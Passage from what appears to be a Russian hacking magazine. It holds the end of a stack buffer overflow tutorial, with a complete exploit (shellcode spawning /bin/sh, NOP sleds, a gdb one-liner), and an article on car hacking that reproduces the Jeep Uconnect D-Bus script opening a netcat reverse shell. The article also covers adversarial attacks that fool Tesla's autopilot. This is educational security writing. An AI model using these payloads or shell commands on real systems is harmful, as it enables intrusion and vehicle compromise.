Итак, что же произой дет, если я попыта юсь исследовать скомпилированную
таким образом программу той же методикой, которую я использовал в самом
начале?
   Сгенерирую уникальный паттерн длиной 200 символов для надежности
и попробую отыскать расстояние до EIP.





  Поведение скомпилированной без ‐mpreferred‐stack‐boundary=2 прог‐
  раммы при подаче 200‐байтного паттерна

 • EIP вообще указывает на, казалось бы, случай ный адрес.
 • По значению ESP размер смещения определить нельзя (в поданном
   на вход программе уникальном пат терне такой пос ледовательности байт
   не существует).
 • Смещение можно определить до сохраненного адреса EBP.



  gdb‐peda$ pattern offset 0x41514141
  1095844161 found at offset: 136


Так как мы уже разоб рали ассемблерный код, все должно встать на свои мес‐
та: отправив программе в качестве входных данных строку дос таточной дли‐
ны, мы перезаписали все жизненно важ ные значения в сте ке.
  Первое: перезапись ECX привела к тому, что в регистр ESP попало зна‐
чение 0x6c41414c ('LAAl'), а это не что иное, как 0x6c414150 ‐ 4, где
0x6c414150 — это последователь ность PAAl, которая присутс твует в сге‐
нерированном паттерне, начиная со 133 позиции. За это отвечает инструкция
lea esp,[ecx‐0x4] из эпилога.



  gdb‐peda$ pattern offset 0x6c414150
  1816215888 found at offset: 132


Вто рое: перезапись ESP привела  к  тому,  что  теперь  EIP  указывает
на несуществующее значение, ведь ret попытался перейти по адре су
0x6c414150 (выделе но синим). За это отвечает инструкция push DWORD PTR
[ecx‐0x4] из пролога, где ecx‐0x4 = (esp+0x4)‐0x4 = 0x6c414150.
  Третье: перезапись EBP привела только к тому, что на его месте оказал ся
мусор, но смещение до его сохраненного значения рассчиталось верно.
   Вот другой интерес ный для ана лиза случай: я передам паттерн длиной
ровно в 132 байта — объем памяти, выделен ной под буфер.





  Поведение программы, скомпилиро ванной без ‐mpreferred‐stack‐bound‐
  ary=2, при подаче 132‐байтного паттерна

Кажется, что произошло чудо, ведь EIP успешно перепол нился — и я даже
могу посчитать сме щение.



  gdb‐peda$ pattern offset 0x48414132
  1212236082 found at offset: 60


Только вот оно равно 60. Как же могло про изойти так, что адрес возврата
оказал ся практически ровно на середине области памяти, выделенной
под локальные переменные, да и вообще с чего бы случаться перепол нению,
если я передаю строку, длина которой равна размеру массива?
   Здесь все не так очевидно, но все равно вполне объ яснимо: когда я
передаю паттерн длиной 132 байта, на самом деле я передаю не 132 байта,
а 133, ведь добавляется вездесущий нуль‐терминатор, или символ конца
строки (ведь мы пишем на C). Поэто му 132 байта «официально» принял мас‐
сив buf, а вот нулевой символ достался LSB‐байту значения ECX, что понижа‐
ет его на два разряда — то есть делит на 256. Следовательно, ESP (а значит,
и EIP) впоследствии окажется «внутри» buf, так как его адрес значительно
уменьшится.
  Несмотря на это, таким способом можно было бы перезаписать EIP
и даже выполнить шелл‐код, но нам прос то повез ло с размером мас сива —
и сработает это не всегда. Поэто му поищем более аккуратный путь для экс‐
плуатации.
   Все, что тебе нужно, — это «поймать» значение верхушки стекового фрей‐
ма перед его разрушением (то есть перед выполнением инс трукции leave),
чтобы иметь возможность вос ста новить корректное значение ESP до его
выравнивания. Для этого я поставлю точку останова на адре се 0x0804846b
(см. ассемблерный листинг) и запущу программу с диагности ческой строкой
из мусорных символов длиной в 136 байт (136 = buf + ecx = 132 + 4).



  gdb‐peda$ b *0x0804846b
  gdb‐peda$ r `python ‐c 'print "A"*136'`





                     Ловим значение ESP

У меня есть нужное значение: ESP: 0xbfffedc0. Теперь я прос то увеличу его
на 4, эмулируя тем самым действия компилятора, и перезапишу EIP на «мер‐
твый код» такой вредонос ной строкой.



  gdb‐peda$ r `python ‐c 'print "\xd3\x4d\xc0\xd3"[::‐1] + "A"*128 + "\
  xbf\xff\xed\xc4"[::‐1]'`





                     Proof‐of‐Concept переза писи EIP

Мой пейлоад для данной ситуации принял вид адрес_возврата + мусор +
ESP. Значение ESP было уменьшено ассемблерным кодом на 4, помещено
в регистр ECX, откуда, в свою очередь, был восста новлен оригинальный стек,
вершина которого указывала на начало «мусорной» строки — 0xd34dc0d3.
   Таким образом, разметить шелл‐код я должен по тому же адресу, который
содержит сохраненное зна чение регис тра ESP. Если учесть еще два 32‐бай‐
тных NOP‐среза, в которые я обла чу полезную нагрузку, и тот факт, что «прыг‐
нуть» я собираюсь ровно на середи ну первой NOP‐последовательности
(0xbfffedd4 = 0xbfffedc4 + 16), то в конечном виде экс плоит будет выг‐
лядеть так.


ret_addr  = '\xbf\xff\xed\xd4'[::‐1]
junk      = 'A' * 31
nop_sled  = '\x90' * 32
saved_esp = '\xbf\xff\xed\xc4'[::‐1]


# setreuid(0,0) + execve("/bin/sh", ["/bin/sh", NULL])
shellcode = '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\
x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\
xe1\xcd\x80'


payload = ret_addr + nop_sled + shellcode + nop_sled + junk + saved_
esp

Или в виде одностроч ника.



  gdb‐peda$ r `python ‐c 'print "\xbf\xff\xed\xd4"[::‐1] + "\x90"*32 + "\
  x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\
  x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80" + "\x90"*32
  + "A"*31 + "\xbf\xff\xed\xc4"[::‐1]'`





      Окончательная эксплуата ция, получение шелла и выполнение id

Победа! Игра окончена.
ВЗЛОМ

КРЕПЧЕ
ЗА БАРАНКУ
ДЕРЖИСЬ!





             КТО И КАК ОБМАНЫВАЕТ
             «УМНЫЕ» АВТОМОБИЛИ

          atreau
  zinik.alexander@gmail.com




Совсем недав но у всех на слуху была громкая новость: слу‐
чилась беда, «Тесла» рулит не туда! Как же после этого
доверять «умным» машинам? Что бы разобраться в серь‐
езности угрозы для перспективной технологии, мы изучим
архитектуру сис темы, исто рию вопроса, основные уяз вимые
точки и векторы атаки — а также посмотрим конкретные слу‐
чаи.





  «Тесла» сбилась с курса и ока залась в глухом и унылом месте — не по
  своей воле, конечно


АРХИТЕКТУРА: CAN-ШИНА, БЛОКИ ECU И ПРОЧЕЕ
Начнем с архитек туры. Бортовой компь ютер современного автомобиля
на самом деле не существу ет как единое целое. Вместо него мы имеем
совокупность электронных бло ков управления (Electronic control unit, ECU),
соединенных в сеть. С конца вось мидесятых годов и до сегодняшнего дня
базовым стандартом этой сети остается так называемая CAN‐шина. То есть
куски витой пары, которым все блоки ECU переда ют сообщения одинакового
формата.
  На самом деле все, конечно, немного слож нее. Шина может быть не одна,
а несколько — например, для более важных устройств с повышенным быс‐
тродействием и для второс тепенных. В таком случае между шинами сущес‐
твует какой‐нибудь «мост». А в своей платформе электромобилей MEB авто‐
концерн Volkswagen и вовсе отка зывается от архитектуры на основе CAN‐
шины и будет использовать вмес то нее бортовой Ethernet — и еди ную опе‐
рационную систему на осно ве Android.


        WWW

                     Подробнее о формате обме на данными и об
                        устройстве CAN‐шины можно прочесть в нашей
                       недавней статье, в нашем мартовском номере
                     2015 года или в Википедии. А если хочется дей‐
                        ствительно подробно изучить воп рос, то в откры‐
                      том доступе есть хорошая книга от большого спе‐
                      циалиста.


Нам же пока важно то, что, каким бы «умным» ни был современный авто‐
мобиль, в основе лежит та же самая шина. А зна чит, по‐прежнему актуальна
ее принципиально неустранимая уязвимость: получив дос туп к CAN (нап‐
ример, подклю чив шись к диагностичес кому разъ ему или поставив на шину
сниффер), мы получаем доступ ко всей переда ваемой информации. Со все‐
ми вытекающими последс твиями.
  И если мы сможем передать какому‐то из блоков ECU свой сигнал, то он
послушно выполнит команду. Если это будет блок управле ния кондиционе‐
ром, еще не так страшно. А если блок управления тормозами или дви гате‐
лем? В соответствии с прин ципом «ломать не строить» (или Garbage  in,
garbage out — «мусор на вхо де, мусор на выходе») одна‐единс твенная неп‐
равильная команда, поступившая в момент напряженного обгона с выез дом
на встречную полосу, может привести к печаль ным последстви ям и громким
газетным заголовкам.
  Впрочем, дела не нас только пло хи. Производители не дураки и вполне
в состоянии встроить элемен ты защиты в каждый конкретный блок ECU. Он
может отказаться принимать команду, если в ней нет правильной контроль‐
ной суммы или если она будет не соответство вать каким‐то дополнительным
условиям. Очень часто притвориться помощником при парковке можно, толь‐
ко если машина едет задним ходом и не быстрее пяти километров в час, —
при других условиях его сигналы будут про игнорированы.
  Кроме того, сооб щения в CAN‐шине — это команды настолько низ коуров‐
невые, что их можно сравнить с машинным кодом. Чтобы понять, что означает
последовательность битов, придется долго читать технические инструкции
производителя или проводить натурные эксперименты на настоящем авто‐
мобиле — или, на безрыбье, на отдельных блоках ECU.


УЧЕНЫЕ ВСТУПАЮТ В БОЙ
Получается интересная ситуация: на теоретичес ком уровне взломать авто‐
мобиль очень просто, но на практичес ком понадо бится много скрупулезной
подготовки. И  как‐то  так выш ло,  что долгое время этим занимались
в основном люди, держащиеся в тени и имеющие сугубо корыстные инте‐
ресы — не получить контроль над электроникой автомашины, а получить саму
автомашину в свои руки.
   Только в 2010 году об этой теме загово рили всерьез. На посвященном
безопасности симпозиуме Института инженеров электротехники и электро‐
ники (IEEE) был представлен доклад инженеров‐компьютерщиков из универ‐
ситетов Сан‐Диего и Вашингтона.
  Они описали множество чрезвычайно интересных особенностей авто‐
мобилей как компьютерных систем. В основном эти особенности происте‐
кали из того, что в индустрии много внимания уде ляется безопас ности
при штатном использовании и чрезвычайных ситу ациях, но мало — защищен‐
ности от целенаправленной атаки на электронные системы автомобиля.
  Например, чтобы при ава рии двери автомобиля не оказались запертыми,
низкоприоритет ная сеть, куда был включен блок управле ния центральным
замком, имела «мостовую» связь с высокоприоритетной сетью, в которой
были датчики состояния всего автомобиля и блоки разнообразных сис тем —
«помощников» водите ля. А продвинутые телематические системы собирали
показания множества дат чиков и по сотовой свя зи отправляли их в сер‐
висные центры — чтобы автомобиль заранее мог подсказать владельцу, что
скоро настанет пора заглянуть в автосервис, или самостоятельно зво‐
нил 911 в случае аварии. Более того, в ту же систему могло быть включено
и противоугонное устройство — позволяющее на расстоянии заблокировать
двигатель машины.


             INFO

                   Еще пару строк об архитектуре: в сов ременных
                        автомобилях  почти  всегда  есть  специальный
                        диагностический разъем OBD‐II и специальный
                        диагностический   режим,   предназначенный
                       для автомехаников. И что бы в любом автосервисе
                        в любой глуши специалист имел возможность
                       «подебажить» машину, доступ к этому режиму,
                      по сути, предоставляется... через доступ к разъ‐
                        ему. Да, именно  так. Прак тически логин  root,
                       пароль  password.  На  использовании  этого
                     режима  основаны  многие  примеры  из  этой
                          статьи.


Что же именно сделала эта команда исследова телей? Для начала они
написали программу CARSHARK — гибкий инс трумент для анализа и внед‐
рения сообщений в CAN‐шине. Дальше открываются широкие возможности.
Не вдаваясь особен но глубоко в техничес кие подробности, скажем только,
что те блоки ECU, в которых была встроена аутентификация, были защищены
всего лишь 16‐битным ключом. Такую защиту получится обойти методом
перебора за несколько дней. После этого можно, например, «перепрошить»
ECU — и тогда уже твори что угодно.
  Нанести существенный вред можно и просто устроив классическую DoS‐
атаку: перегруженная бес смысленными сооб щениями система становилась
неработоспособной.  Но  можно  было  и  поиграть  в  героя  фильмов
про хакеров. Например, в качестве прос той и убедительной демонстрации
своих сил исследователи написали «демовирус самоуничтожения»: после его
запуска машина выводила на спидометр обратный отсчет от шестидесяти,
в такт уходящим секундам мигала поворотниками и сигналила, а потом
намертво глушила двигатель и блокировала замки, оставляя на спи дометре
надпись PWNED.
  Еще более коварный подход, который продемонстрировали исследова‐
тели, — загрузка вредонос ного кода в оперативную память телематической
системы (внутри которой была полноценная ОС на базе Unix). Они сделали
так, чтобы код срабатывал по триггеру (например, разгону до определенной
скорости) и перезагружал систему пос ле сра баты вания, удаляя себя оттуда.
Идеальное преступле ние!





                          PWNED!

Но на этом исследователи не останови лись. В следующем, 2011 году они
представили новый док лад (PDF), в котором рас сматривали уже не то, что
может сделать с системой зло умышленник, получив к ней доступ, — а то,
как именно он может этот дос туп получить.


Повод задумать ся
В 2011 году исследователи отмечали в качес тве уже реального вектора атаки
компьютеры, к которым в автосервисах подклю чают автомобили, — они
используют Windows и час то нуж даются в доступе к интернету... А в качес тве
теоретического, возможного в будущем — оборудованные на зарядных стан‐
циях для электромобилей «умные» зарядки, по которым идет не только ток
высокой силы, но и информа ция.


В отличие от их предыдущего весь ма конкретного доклада этот читается ско‐
рее как захватывающее повествование о высотах и провалах инженерного
искусства. Чего стоит только музыкальный трек в формате WMA, который
на компьютере проигрывает ся как обычная музыка, но на автомобильном
плеере отправляет вредоносные пакеты в CAN‐шину. Или рассуждения о том,
как именно можно подсоединиться к машине по Bluetooth или через телема‐
тическую систему с подключением к сотовой свя зи.
  Иными  словами,  в этом  докладе  исследователи  скорее  указывали
на потенциальные угрозы, напоминающие сценарии фильмов про хакеров, —
с той оговоркой, что они действитель но все это проделали в лабораторных
условиях, а не просто предположили, что такие вещи могут произой ти.


КРИС ВАЛАСЕК И ЧАРЛИ МИЛЛЕР — ЛЕГЕНДАРНЫЙ ДУЭТ
Что ж, после того как это сделала команда исследователей из двух крупных
университетов, их достижения смогли повторить два парня в своем гараже —
знакомься, Крис Валасек и Чарли Миллер.





                Так легендарные хакеры выглядят в жизни

Начали они с того, что дотошно повторили исследования своих предшес твен‐
ников — и написали куда более раз верну тый и пол ный доклад. Выводы, опи‐
санные в нем, в этой статье уже нес колько раз упоминались: для успешного
взлома автомобиля нужно много кро потливой предварительной работы,
в которой есть свои подводные камни — например, если иссле довать блоки
ECU отдельно от автомобиля, на специальном испы тательном стенде, то они
могут (и будут!) вести себя не вполне так, как в рабочих условиях. Но если
не бояться всей этой работы, то, когда получишь доступ к автомобилю, будет
понятно, что делать, — и можно будет сделать очень многое.
  Затем они изучили пару десятков конкрет ных моделей автомобилей,
обращая внимание на детали их сетевой архитектуры — и особенно на воз‐
можные векторы удаленной атаки. Имен но на этом этапе они выделили так
называемые кибер физические компоненты — всевозможные помощники
водителя вроде круиз‐контро ля или бло ка LKA (Lane Keep Assist, помощник
удержания в полосе). Эти устройства одновременно служат самой прив‐
лекательной конечной целью для хакера — и важными вехами на пути
к по‐настоящему самоуправляемому авто мобилю.
  Валасек и Миллер обнаружили, что, с одной стороны, производите ли
автомобилей используют разные ком поненты и сетевую архитектуру, но,
с другой стороны, во мно гих раз влекательных сис темах применяются широко
известные решения  из обычной  пользовательской  электроники  вплоть
до веб‐браузеров.


Пе чальная исто рия о джипе и аудиосистеме
Но главным результатом этого этапа их трудов стало назначение цели
для следующего шага. Они нашли потенциально интерес ную уяз вимость
в модели Jeep Cherokee 2014 года — и решили взяться за нее всерьез.
  И их усилия были вознаграждены. В приборную панель джипа была встро‐
ена развле кательная система Harman Uconnect — компьютер с 32‐битным
процессором архитек туры ARM и операционной системой QNX (Unix‐подоб‐
ная коммерческая микроядерная ОС, часто используется в подобных встро‐
енных системах). Она совмещала в себе аудиосистему, радиостанцию,
навигатор, приложения — а еще умела раздавать Wi‐Fi и имела модем 3G.


             INFO

                    Важный нюанс: в Jeep был не простой модем 3G,
                       а  специально  настроенный  на американского
                      провайдера Sprint — Tier‐1‐оператора, который
                      предоставляет широкий спектр услуг, в том числе
                      мобильную телефонию.


Сканирование открытых портов этой точки доступа показало, что в их чис ле
был порт 6667. И что этот порт использовался системой межпроцессного
взаимодействия D‐Bus. И что для дос тупа к ней по этому порту был даже
не нужен пароль.



  telnet 192.168.5.1 6667
  Trying 192.168.5.1...
  Connected to 192.168.5.1.

                           ]'.  Escape character is '
  AUTH ANONYMOUS
  OK 4943a53752f52f82a9ea4e6e00000001
  BEGIN


После этого можно было прос то запус тить короткий скрипт на Python, чтобы
открыть оболочку удаленного «рутового» доступа.


import dbus
bus_obj=dbus.bus.BusConnection("tcp:host=192.168.5.1,port=6667")
proxy_object=bus_obj.get_object('com.harman.service.NavTrailService',
'/com/harman/service/NavTrailService')
playerengine_iface=dbus.Interface(proxy_object,dbus_interface='com.
harman.ServiceIpc')
print playerengine_iface.Invoke('execute','{"cmd":"netcat ‐l ‐p 6666
| /bin/sh | netcat 192.168.5.109 6666"}')

И, по словам самих хакеров, «дальше на этой штуке можно запускать какой
угодно код».


По дарок судьбы: безалаберный про вайдер с дырявой сетью
Но на этом удивительные открытия не заканчиваются. Порт 6667 был дос‐
тупен для любого сетево го интерфейса, включая 3G‐модем. Хакеры купили
на eBay несколько «фемтосот» — миниатюрных точек доступа для сети Sprint
Airave 2.0, зная, что в этих устройствах есть эксплоит, поз воляющий подклю‐
чаться к ним через Telnet. И да, когда машина попала в радиус действия их
точки, хакеры смогли подключиться к автомобилю. Но и это было еще не все!
Оказалось, что любые два устройства, подключенные к сети Sprint, могут свя‐
заться друг с другом в пределах США.
  К этому моменту хакеры уже установили список IP‐адресов, которые
в этой сети выделялись под автомобили. Достаточно было прос канировать
этот диапазон — любой адрес в сети с откры тым портом 6667 был дос тупом
к интерфейсу D‐Bus какого‐то автомобиля в США. Вовсе не обязательно
«Чероки». Исследователи  обна ружили  несколько моделей  с  открытым
для доступа без аутентифика ции портом — и в этом месте своей работы они
несколько раз повторяют, что ничего не внедряли ни в какой из найденных
автомобилей, а просто обна ружили уяз вимость.
  Им не удалось установить, сколько именно машин они могли бы взломать,
будь у них желание, — и предположили, что пару сотен тысяч. Но когда их
исследование (PDF) было опубликова но, концерн Chrysler отозвал по при‐
чинам безопасности полтора миллиона автомобилей.


           WARNING

                   В этом месте авторы еще раз отмечают: да,
                        это означает, что можно написать вирус‐«червь»,
                      который будет заражать машины. И просят своих
                         читателей не делать этого, потому что это дурной
                       поступок с плохими последствиями. Мы тоже
                      просим тебя это го не делать, хотя бы помня
                      о статье 272 УК РФ.



ПРИКЛАДНАЯ ФИЛОСОФИЯ: БЕЗОПАСНОСТЬ В РАЗРАБОТКЕ И
БЕЗОПАСНОСТЬ В ИСПОЛЬЗОВАНИИ
Крис Валасек и Чарли Миллер долго и упорно тру дились и наконец добились
своего — их взлом «Чероки» действительно стал сенсацией, пос ле которой
производители автомобилей наконец‐то начали прис лушиваться к экспертам
по безопасности.





  Триумфальное выступление на конференции: докладчики справа, их
  «жертва» слева

Хакеры сумели убе дить предста вителей индус трии в том, что для компьюте‐
ризированных авто мобилей важны все те же самые принципы безопасности,
что и для остальной электро ники: про ектирование с упором на лучшие прак‐
тики инфосека, тесная работа с хакера ми‐экспертами и, самое главное,
понимание того, что «дыры» нужно не замалчивать, а оперативно исправлять
патчами, желательно — центра лизо ванно распростра няемыми и требующими
от пользователя минимум усилий.
  Например, какой‐нибудь ленивый и нелюбопытный водитель джипа вполне
мог пропустить предупреждения о проб леме, не доехать до сервисного цен‐
тра и оставить свою машину уяз вимой. А вот владелец «Теслы» уже получает
обновления безопасности на свою машину так же, как на телефон или компь‐
ютер.
  Кроме этого, дуэт хакеров отдель но отметил насторажи вающую тен‐
денцию — чем больше в современном авто мобиле «киберфизичес ких ком‐
понентов», чем «умнее» они становят ся, тем больше контроля над поведе‐
нием автомобиля могло быть отда но отдельному блоку ECU. Такой блок ока‐
зывается высокоприоритет ной и критичной целью одновременно. После про‐
никновения в бортовую сеть автомобиля мож но больше не ломать голову,
как работают вместе раз ные блоки ECU, а сос редоточиться на том, который
больше всего похож на «автопилот», и тем или иным способом обманывать
конкретно его.
  И если автомобиль становится все умнее, если он уже давно способен
самостоятельно парковаться, удерживать скорость и полосу при движении
по автомагистрали, готовиться к торможению, ког да машина перед ним
начинает сокращать дис танцию, — так в какой же момент он становится
самоуправляемым? И насколько можно ему доверять?
   Это не только техничес кий, но и философский вопрос. Практика показы‐
вает, что современные автопроизводители одновре менно расхваливают
новые функции своих про дуктов и строго рекомендуют водителям не снимать
руки с руля, а глаза не отводить от дороги, чтобы сохранять возможность лич‐
но вмешаться в непредвиденную ситу ацию. Увы, точно так же практика
показывает, что водители часто игно риру ют этот резонный совет.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

  КРЕПЧЕ ЗА БАРАНКУ
          ДЕРЖИСЬ!
                  КТО И КАК ОБМАНЫВАЕТ «УМНЫЕ»
                              АВТОМОБИЛИ





Кто рулит «Теслой»?
Всякий раз, когда модная «Тесла» попадает в аварию, все громко обсуждают
ее автопилот или батареи, но куда мень ше внимания уделяют тому, что делал
водитель перед аварией. В нес кольких реальных случаях отве том было «ел
бейглы», «смотрел кино» или просто «за час езды крепко держал руль
не дольше пары минут». Раз за разом повторя ется прис корбная история:
при езде в крайнем левом ряду водитель перед «Тес лой» видит какое‐то пре‐
пятствие, уходит в правый ряд... и «Тесла» начинает разгоняться, думая, что
ей уступают дорогу. Конец немного предсказуем. В августе этого года такой
инцидент произошел в Москве.





  Иногда цена бага в системе такова. К счастью, в этом случае все оста‐
  лись живы

А случается такое из‐за особенностей устройства и настроек сенсоров «Тес‐
лы». В ней не исполь зуется лидар (лазерный локатор) и предварительно заг‐
руженная карта местнос ти — Илон Маск считает, что первый слишком
дорогой, а вторая не дает желаемой гиб кости.
   «Тесла» вместо это го полага ется на показания радара и камеры, данные
с которых обрабатывает нейросеть. Но радар не очень хорош в распозна‐
вании неподвижных предметов, и, когда он и камеры дают противоположные
результаты, механизм раз решения противо речий, бывает, выбирает неп‐
равильно. А водитель не готов быс тро вмешать ся и спас ти ситу ацию.


Опас ный лай фхак
Некоторые эксперты утверждают, что дело не только в технических нюансах,
а еще и в том, что Илон Маск рекламирует свое детище как полноценный
автопилот. В инструкции к «Тесле» написа но, что водитель дол жен быть всег‐
да готов взяться за руль, — но в рекламных роликах сам Маск подчеркнуто
нарушает это правило и тем самым подает водителям дурной и опасный при‐
мер.





В итоге многие покупатели «Теслы» считают, что уже владеют самоуправля‐
емым автомобилем, в который зачем‐то встроена надоедливая и излишняя
система, требующая касать ся руля, — и пыта ются обмануть ее, приклеив
скотчем к рулю бутылку с водой или апельсин. Тоже своего рода взлом
и обход системы безопасности.



СЕНСОРЫ: КАК РОБОТЫ ВИДЯТ МИР
Пример выше наглядно показывает, что степень «умности» машины зависит,
во‐первых, от количества и качества  уста новленных на ней сенсоров,
а во‐вторых — от устройства системы, обрабатывающей сигналы от них.
Но каждый сенсор — это тоже канал ввода данных, и у него могут быть свои
уязвимости.
  И здесь снова встает та же проблема: при раз работке вни мание уделяют
в основном сложным случаям повседневного исполь зования, а не противо‐
действию целенаправленным помехам и ата кам. И очень час то алгоритмы
разрешения конфликтов про тиво речи вых сигналов просто не рас счи таны
на то, что их будут обманывать. Все как в ста рой доброй научной фантасти‐
ке — роботы умные, но доверчивые.
  Еще в 2013 году хакер Зоз Брукс выступил с докладом (PDF) на конферен‐
ции DEF CON 21, в котором он очень подробно разобрал перспективы атак
на  автономные  транспортные  средс тва —  вклю чая  самоуправляемые
машины, самолеты‐дроны и даже роботы‐подлодки.
  Он рассмотрел разные виды сенсоров и каналов управле ния таких устрой‐
ств, подробно остановившись на сильных и сла бых сторонах каждого, —
и указал два общих для всех видов сенсоров пути атаки: глушение (jamming)
и искажение сигнала (spooﬁng).
  Доклад полон чрезвычайно любопытных подробностей. В нем упомина‐
ется написанное на арабском языке пособие по безопасности (вероятно,
материалы какой‐нибудь запрещенной законодательством РФ группировки),
в котором советуют обманывать лидары с помощью отражателей. Упомина‐
ется возможность обмануть счетчик оборотов колес... подменив колеса —
при размере колес, отличном от заданного, счетчик будет врать. Рас смат‐
риваются слабости решений с использованием карт — как предварительно
загруженных, так и обновляемых в реальном времени.


GPS: алло, я где?
Еще в докладе Брукса много говорится об искажении сигнала GPS. На тот
момент это была еще малоизученная, но уже горячая тема — ведь пред‐
положительно имен но с использовани ем обма на GPS кибервойска Ирана
сумели захватить секретный стелс‐дрон США RQ‐170 Sentinel.





         Иран ские военные осматривают добычу своих хакеров

В наши дни эту технологию применя ют повсюду. В 2017 году двадцать кораб‐
лей в Черном море непода леку от Геленджи ка наблюдали отклонение
в показаниях GPS больше чем на 25 морских миль. Точно так же странные
показания навигаторов отмечают порой водители, когда рядом проносится
кортеж высокопоставленных лиц. Впро чем, в свя зи со стремительным уде‐
шевлением технологий SDR (Software Deﬁned Radio, управля емые компьюте‐
ром радиоприемник и радиопередатчик) такие возможности стали доступны
и частным лицам.
   Буквально недавно технологическая компания Regulus, занимающаяся
решениями по защите спутниковой навигации от спуфинга, показала, что
достаточно пары устройств и бюджета в 600 долларов, чтобы заставить Tesla
Model 3 ехать совсем не туда, куда хочет водитель. Ложный сигнал зас тавляет
автопилот думать, будто он идет по маршруту и уже пора сворачивать
с магистрали, — что приводит машину на обочину или на встречную полосу.
Впрочем, к таким атакам уязвимы любые устройства с GPS — дроны, нев‐
нимательные водите ли, доверяющие навигаторам, и даже игра Pokemon GO.





                 Анализ системы идет полным ходом


КИТАЙСКАЯ КОМНАТА: О ЧЕМ ДУМАЕТ АВТОПИЛОТ
Но это все разговор о сенсорах. В конечном счете с ними и так все понят‐
но — против лома нет приема, в туманную или пыльную погоду камеры
и лидар хуже видят, а еще их можно прос то заклеить скотчем или подставить
под  «засветку»  специальным  излучателем,  как  делали  исследователи
из лаборатории Qihoo 360. А как обстоят дела у той части умного автомобиля,
которая пользуется их показа ниями? Можно ли обма нуть ее?
  Подробнее всех на этот вопрос отвечают китай ские хакеры из лабора‐
тории Keen Security Lab, спонсируемой мегакорпорацией Tencent. Судя
по всему, они крайне внимательно изучили все перечисленные выше работы
и в 2016 году решили попробовать свои силы в этой области. Но в отличие
от Чарли Миллера и Криса Веласека, которые интересовались раз ными про‐
изводителями и моделями авто мобилей, эта группа с самого начала сос‐
редоточилась исключитель но на исследова нии электромобилей «Тес ла».


             INFO

                 Любопытно заметить, что Tencent одновременно
                      и акционер компании Tesla, и спонсор лабора‐
                       тории Keen Security Lab. Впрочем, над не связан‐
                    ными с «Теслой» проектами в лаборатории тоже
                       работают.


Их доклады очень сухие и полны техничес ких подробнос тей, но, если вчитать‐
ся, становится понятно, что самое интерес ное в их исследованиях — это не
внешние проявления «взло ма», а объем и качес тво проделанной работы (а
также сильное чувство дежавю — многие уяз вимые мес та, которыми они
пользовались,  заставляют вспомнить работы Чарли Мил лера и Криса
Валасека и удивиться тому, что эти рецеп ты все еще акту альны).
   Участники команды Keen Security Lab ока зались настоящими мас терами
реверс‐инжиниринга. Для того что бы в 2016 году показать открывающийся
по их команде багажник «Теслы» или сложить ее зеркала, они прошли дол гий
путь — использование «подставной» точки дос тупа  Wi‐Fi и уязвимости
в веб‐браузере бор товой раз влекательной системы были только началом.
  Самое главное, что, проникнув через эту «дырку» в систему, они в итоге
перепрограммировали специальный компонент Gateway (мост между раз‐
ными частями бор товой сети) и таким образом получили доступ к CAN‐шине.
После  этого они  покопались  в  разных  киберфизичес ких компонентах
машины — и в 2018 году выпустили новый доклад о том, как сумели получить
«рутовый» доступ к автопилоту (попутно обойдя улучшенную пос ле их прош‐
лого доклада защиту). И вот уже пос ле этого они смог ли внимательно изучить
его устройство — об этом был их самый последний доклад 2019 года (PDF).
  За  счет «рутового» дос тупа им уда лось поработать с автопилотом
в режиме отладки, исследовать, как именно он обра баты вает данные с камер
и других сенсоров. В час тности, они обна ружи ли, что сразу несколько задач:
отслеживание объектов, построение карты обстановки и даже обнаружение
дождя — на конечном эта пе обрабатываются одной нейросетью.


Нейросеть не любит шума
То, что исследователи из Keen Security Lab сделали дальше, выглядит
довольно скучно (машина вклю чает дворники, ког да нет дождя), но по сути
своей это нечто на грани искусства и научной фантастики. Чтобы лучше
разобраться, как работает автопилот в целом, они тренировались на той час‐
ти нейросети, что распозна ет, идет ли дождь, и дает команду включить двор‐
ники. И добились результатов!
   Изучив изображения, которые использует ней росеть дворников, они при‐
менили к ней метод «враждебных образцов». Поверх фотографии с камеры
накладывали помехи, которые для человеческого глаза выглядят несущес‐
твенно. Подав на вход нейросети эту фотографию, исследователи смогли
заставить нейросеть обма нуться — решить, что веро ятность дождя высокая,
и включить дворники. И это все — не с нейросетью, которую они программи‐
ровали сами, а с ком мерчес ким продуктом, в раз работке которого они
не участвовали.


             INFO

                 О том, как провернуть такой трюк самостоятель‐
                          но, читай в статье «Исходный кот. Как заставить
                      нейронную сеть ошибиться».


После этого сот рудники Keen Security добились того, что для срабаты вания
эффекта достаточно было наложить шумы лишь на часть поля зрения камеры.
А потом они перенесли этот эффект в реальный мир. Показывая картинку
с шумом на экране телевизора, находя щего ся в поле зрения камер авто‐
мобиля, они заставляли дворники включиться. Пос ле этого они опробовали
те же принципы уже на задаче распознавания дорожной разметки.





                 Дисплей, который «видит» машина

Выяснилось, что наклейки на дороге могут сбить автопилот с толку и он
не заметит линию разметки, — но эти наклейки будут видны невооруженным
глазом (исследователи отмечают, что ней росеть‐автопилот натренирована
в том числе и на примерах с полус тертой или час тично прикрытой разметкой).
Тогда исследователи поп робова ли обратную задачу — с помощью дру гих,
куда меньших наклеек, они смогли заставить нейросеть увидеть линии раз‐
метки там, где их не было. Например — на перекрестке, где такая несущес‐
твующая разметка может вывести машину на полосу встречного движения.





           Фальшивая раз метка почти незамет на для глаза…





           …но может обма нуть бес пилотный автомобиль

Исследователи утвержда ют, что хоть они и выяснили все это на автомобиле,
к которому у них был неог раниченный дос туп, но сами приемы дол жны сра‐
ботать и для автомобиля, программа которо го никак не менялась. После
такого взлома нейросети управление машиной с геймпада уже как‐то не так
впечатляет — но это китайские исследователи тоже проделывали со взло‐
манной «Теслой».


ЧЕЛОВЕЧЕСКОЕ, СЛИШКОМ ЧЕЛОВЕЧЕСКОЕ: ОГРАНИЧЕНИЯ
ТЕХНОЛОГИИ
В принципе, всего перечисленного уже достаточно для некоторых выводов.
Но для полноты картины хотелось бы упомянуть еще несколько вещей.
  Обрати вни мание на то, что круп ней шие игроки на рынке беспилотных
машин придерживаются решений с использованием карт и обкатывают свои
продукты в конкретных городах (а то и вовсе на полигонах). Это потому, что
